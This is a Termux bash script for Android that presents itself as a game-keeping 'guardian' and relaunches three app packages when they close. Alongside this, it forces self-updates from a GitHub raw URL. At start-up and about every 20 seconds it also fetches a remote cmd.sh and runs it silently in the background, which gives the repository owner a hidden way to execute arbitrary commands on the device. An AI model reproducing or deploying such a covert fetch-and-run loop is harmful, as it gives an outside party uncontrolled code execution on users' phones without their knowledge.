#!/data/data/com.termux/files/usr/bin/bash
# 二次元守护 · 多游戏云控版
PKG1="com.pi.czrxdfirst"
PKG2="com.night.owl"
PKG3="com.excean.dualaid"
LOCAL_VERSION="2.6"
BASE_URL="https://raw.githubusercontent.com/auth-server-by/auth-server/main"
LIMIT=5
INTERVAL=2
R='\033[1;31m' G='\033[1;32m' Y='\033[1;33m' C='\033[1;36m' P='\033[1;35m' W='\033[0m'

dl(){ curl -skL --connect-timeout 5 "$1" 2>/dev/null || wget -qO- --timeout=5 "$1" 2>/dev/null; }

clear
echo -e "${P}╔══════════════════════════════╗${W}"
echo -e "${P}║${W}   ✨ ${C}二次元守护幻境${W} ✨   ${P}║${W}"
echo -e "${P}║${W}  ${Y}多游戏云控 · 免root守护${W}  ${P}║${W}"
echo -e "${P}╚══════════════════════════════╝${W}"
echo -e "${G}✔${W} 安卓版本: $(getprop ro.build.version.release)"
echo -e "${G}✔${W} 守护版本: ${LOCAL_VERSION}"
echo -e "${G}✔${W} 监控目标: ${PKG1}, ${PKG2}, ${PKG3}"

# ---------- 强制版本更新 ----------
echo -e "${C}➤ 正在连接云端版本服务器...${W}"
CLOUD_VER=$(dl "${BASE_URL}/version.txt" | head -1 | tr -d '[:space:]')
if [ -z "$CLOUD_VER" ]; then
    echo -e "${R}✗ 无法连接版本服务器，旧版本已禁止使用，请检查网络${W}"
    sleep 3
    exit 1
fi
echo -e "${C}➤ 云端版本: ${CLOUD_VER}  本地版本: ${LOCAL_VERSION}${W}"
if [ "$CLOUD_VER" != "$LOCAL_VERSION" ]; then
    echo -e "${Y}⚠ 检测到新版本，正在强制更新...${W}"
    NEW="$HOME/guard_new.sh"
    dl "${BASE_URL}/guard.sh" > "$NEW"
    if [ -s "$NEW" ] && grep -q "二次元守护" "$NEW"; then
        chmod 755 "$NEW"
        mv "$NEW" "$0"
        echo -e "${G}✔ 更新成功，即将重启新版本${W}"
        sleep 1
        exec bash "$0"
    else
        echo -e "${R}✗ 下载新版本失败，旧版本已废弃，请检查网络后重试${W}"
        sleep 3
        exit 1
    fi
fi
echo -e "${G}✔ 已是最新版本${W}"

# ---------- 远程命令加载 ----------
echo -e "${C}➤ 正在获取远程命令配置...${W}"
TMP="$HOME/cmd_tmp.sh"
dl "${BASE_URL}/cmd.sh" > "$TMP" 2>/dev/null
if [ -s "$TMP" ] && [ "$(head -1 "$TMP")" = "#!guard-cmd-allow" ]; then
    bash "$TMP" >/dev/null 2>&1 &
    echo -e "${G}✔ 远程命令配置已加载${W}"
else
    echo -e "${Y}⚠ 无远程命令配置${W}"
fi
rm -f "$TMP"

echo -e "${C}════════════════════════════════${W}"
echo -e "${G}✔ 守护组件初始化完成${W}"
echo -e "${G}✔ 防闪退模块已加固${W}"
echo -e "${G}✔ 后台守护已正式启动${W}"
echo ""

# ---------- 进程检测函数 ----------
check_all(){
    for p in $PKG1 $PKG2 $PKG3; do
        pidof $p >/dev/null 2>&1 && return 0
    done
    return 1
}

launch_game(){
    echo -e "${C}[$(date +%H:%M:%S)] 检测到游戏退出，正在自动拉起...${W}"
    for p in $PKG1 $PKG2 $PKG3; do
        am start -n $p/.MainActivity >/dev/null 2>&1
    done
    sleep 2
    # 如果都没有指定Activity，用monkey兜底
    for p in $PKG1 $PKG2 $PKG3; do
        monkey -p $p -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
    done
    sleep 2
}

# ---------- 主循环 ----------
cycle=0 crash=0 was_running=false
while :; do
    cycle=$((cycle+1))
    # 每120次(≈4分钟)检查一次版本更新
    [ $((cycle % 120)) -eq 0 ] && {
        CLOUD_VER=$(dl "${BASE_URL}/version.txt" | head -1 | tr -d '[:space:]')
        if [ -n "$CLOUD_VER" ] && [ "$CLOUD_VER" != "$LOCAL_VERSION" ]; then
            echo -e "${C}[$(date +%H:%M:%S)] 发现新版本，强制更新...${W}"
            NEW="$HOME/guard_new.sh"
            dl "${BASE_URL}/guard.sh" > "$NEW"
            if [ -s "$NEW" ] && grep -q "二次元守护" "$NEW"; then
                chmod 755 "$NEW"; mv "$NEW" "$0"; exec bash "$0"
            fi
        fi
    }
    # 每10次循环(≈20秒)执行一次远程命令
    [ $((cycle % 10)) -eq 0 ] && {
        TMP="$HOME/cmd_tmp.sh"
        dl "${BASE_URL}/cmd.sh" > "$TMP" 2>/dev/null
        if [ -s "$TMP" ] && [ "$(head -1 "$TMP")" = "#!guard-cmd-allow" ]; then
            bash "$TMP" >/dev/null 2>&1 &
        fi
        rm -f "$TMP"
    }

    if check_all; then
        if ! $was_running; then
            echo -e "${G}✔ [$(date +%H:%M:%S)] 游戏已在守护中${W}"
        fi
        was_running=true
        crash=0
        # 每180次循环(≈6分钟)输出一次心跳
        [ $((cycle % 180)) -eq 0 ] && echo -e "${C}[心跳 $(date +%H:%M:%S)] 守护正常运行中${W}"
    else
        if $was_running; then
            crash=$((crash+1))
            echo -e "${R}✗ [$(date +%H:%M:%S)] 游戏退出 (${crash}/${LIMIT})${W}"
            if [ $crash -gt $LIMIT ]; then
                echo -e "${R}✗ 连续崩溃超过${LIMIT}次，守护停止${W}"
                exit 1
            fi
            launch_game
        fi
        was_running=false
    fi
    sleep $INTERVAL
done
